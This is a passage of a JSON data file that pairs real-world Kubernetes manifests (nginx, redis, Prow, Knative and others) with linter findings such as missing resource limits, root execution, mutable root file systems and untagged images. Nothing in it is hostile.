    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "01207",
    "manifest_path": "data/manifests/the_stack_sample/sample_0323.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "01208",
    "manifest_path": "data/manifests/the_stack_sample/sample_0329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cidotnet-pod\" is using an invalid container image, \"markaw/cidotnet-app\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01209",
    "manifest_path": "data/manifests/the_stack_sample/sample_0329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cidotnet-pod\" does not have a read-only root file system"
  },
  {
    "id": "01210",
    "manifest_path": "data/manifests/the_stack_sample/sample_0329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cidotnet-pod\" is not set to runAsNonRoot"
  },
  {
    "id": "01211",
    "manifest_path": "data/manifests/the_stack_sample/sample_0329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cidotnet-pod\" has cpu request 0"
  },
  {
    "id": "01212",
    "manifest_path": "data/manifests/the_stack_sample/sample_0329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cidotnet-pod\" has memory limit 0"
  },
  {
    "id": "01213",
    "manifest_path": "data/manifests/the_stack_sample/sample_0330.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upstream\nspec:\n  selector:\n    matchLabels:\n      app: upstream\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: upstream\n    spec:\n      containers:\n      - name: upstream\n        image: signalrbenchmark/perf:1.4.4\n        resources:\n          requests:\n            cpu: 100m\n            memory: 1024Mi\n          limits:\n            cpu: 150m\n            memory: 1024Mi\n        volumeMounts:\n        - mountPath: /mnt/perf\n          name: volume\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cp /mnt/perf/manifest/SignalRUpstream/SignalRUpstream.zip /home ; cd /home\n          ; unzip SignalRUpstream.zip ; exec ./SignalRUpstream\n      volumes:\n      - name: volume\n        azureFile:\n          secretName: azure-secret\n          shareName: perf\n          readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"upstream\" does not have a read-only root file system"
  },
  {
    "id": "01214",
    "manifest_path": "data/manifests/the_stack_sample/sample_0330.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upstream\nspec:\n  selector:\n    matchLabels:\n      app: upstream\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: upstream\n    spec:\n      containers:\n      - name: upstream\n        image: signalrbenchmark/perf:1.4.4\n        resources:\n          requests:\n            cpu: 100m\n            memory: 1024Mi\n          limits:\n            cpu: 150m\n            memory: 1024Mi\n        volumeMounts:\n        - mountPath: /mnt/perf\n          name: volume\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cp /mnt/perf/manifest/SignalRUpstream/SignalRUpstream.zip /home ; cd /home\n          ; unzip SignalRUpstream.zip ; exec ./SignalRUpstream\n      volumes:\n      - name: volume\n        azureFile:\n          secretName: azure-secret\n          shareName: perf\n          readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"upstream\" is not set to runAsNonRoot"
  },
  {
    "id": "01215",
    "manifest_path": "data/manifests/the_stack_sample/sample_0331.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: local-redis\n  labels:\n    deployment: local-redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: local-redis\n  template:\n    metadata:\n      labels:\n        pod: local-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "01216",
    "manifest_path": "data/manifests/the_stack_sample/sample_0331.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: local-redis\n  labels:\n    deployment: local-redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: local-redis\n  template:\n    metadata:\n      labels:\n        pod: local-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "01217",
    "manifest_path": "data/manifests/the_stack_sample/sample_0331.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: local-redis\n  labels:\n    deployment: local-redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: local-redis\n  template:\n    metadata:\n      labels:\n        pod: local-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "01218",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"dhcp-server\" is using an invalid container image, \"xunholy/dhcp-server:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01219",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dhcp-server\" does not have a read-only root file system"
  },
  {
    "id": "01220",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dhcp-server\" is not set to runAsNonRoot"
  },
  {
    "id": "01221",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dhcp-server\" has cpu request 0"
  },
  {
    "id": "01222",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dhcp-server\" has memory limit 0"
  },
  {
    "id": "01223",
    "manifest_path": "data/manifests/the_stack_sample/sample_0333.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: my-cron-job\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        name: my-cron-job\n        labels:\n          job: my-cron-job\n      spec:\n        containers:\n        - name: my-cron-job\n          image: alpine:3.15.0\n          resources:\n            limits:\n              memory: 16Mi\n              cpu: 10m\n          command:\n          - sh\n          - -c\n          - echo \"doing my job $(date)\"\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"my-cron-job\" does not have a read-only root file system"
  },
  {
    "id": "01224",
    "manifest_path": "data/manifests/the_stack_sample/sample_0333.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: my-cron-job\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        name: my-cron-job\n        labels:\n          job: my-cron-job\n      spec:\n        containers:\n        - name: my-cron-job\n          image: alpine:3.15.0\n          resources:\n            limits:\n              memory: 16Mi\n              cpu: 10m\n          command:\n          - sh\n          - -c\n          - echo \"doing my job $(date)\"\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"my-cron-job\" is not set to runAsNonRoot"
  },
  {
    "id": "01225",
    "manifest_path": "data/manifests/the_stack_sample/sample_0333.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: my-cron-job\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        name: my-cron-job\n        labels:\n          job: my-cron-job\n      spec:\n        containers:\n        - name: my-cron-job\n          image: alpine:3.15.0\n          resources:\n            limits:\n              memory: 16Mi\n              cpu: 10m\n          command:\n          - sh\n          - -c\n          - echo \"doing my job $(date)\"\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"my-cron-job\" has cpu request 0"
  },
  {
    "id": "01226",
    "manifest_path": "data/manifests/the_stack_sample/sample_0335.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20211108-892eb8add1\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"horologium\" is not set to runAsNonRoot"
  },
  {
    "id": "01227",
    "manifest_path": "data/manifests/the_stack_sample/sample_0335.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20211108-892eb8add1\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"horologium\" has cpu request 0"
  },
  {
    "id": "01228",
    "manifest_path": "data/manifests/the_stack_sample/sample_0335.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20211108-892eb8add1\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"horologium\" has memory limit 0"
  },
  {
    "id": "01229",
    "manifest_path": "data/manifests/the_stack_sample/sample_0337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook\n      role: webhook\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: webhook\n        role: webhook\n        serving.knative.dev/release: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: webhook\n        image: knative.dev/serving/cmd/webhook\n        ports:\n        - name: metrics-port\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/serving\n        securityContext:\n          allowPrivilegeEscalation: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"webhook\" is using an invalid container image, \"knative.dev/serving/cmd/webhook\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01230",
    "manifest_path": "data/manifests/the_stack_sample/sample_0337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook\n      role: webhook\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: webhook\n        role: webhook\n        serving.knative.dev/release: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: webhook\n        image: knative.dev/serving/cmd/webhook\n        ports:\n        - name: metrics-port\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/serving\n        securityContext:\n          allowPrivilegeEscalation: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"webhook\" does not have a read-only root file system"
  },
  {
    "id": "01231",
    "manifest_path": "data/manifests/the_stack_sample/sample_0337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook\n      role: webhook\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: webhook\n        role: webhook\n        serving.knative.dev/release: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: webhook\n        image: knative.dev/serving/cmd/webhook\n        ports:\n        - name: metrics-port\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/serving\n        securityContext:\n          allowPrivilegeEscalation: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"webhook\" is not set to runAsNonRoot"
  },
  {
    "id": "01232",
    "manifest_path": "data/manifests/the_stack_sample/sample_0338.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "01233",
    "manifest_path": "data/manifests/the_stack_sample/sample_0338.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "01234",
    "manifest_path": "data/manifests/the_stack_sample/sample_0338.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "01235",
    "manifest_path": "data/manifests/the_stack_sample/sample_0338.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "01236",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "01237",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "01238",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
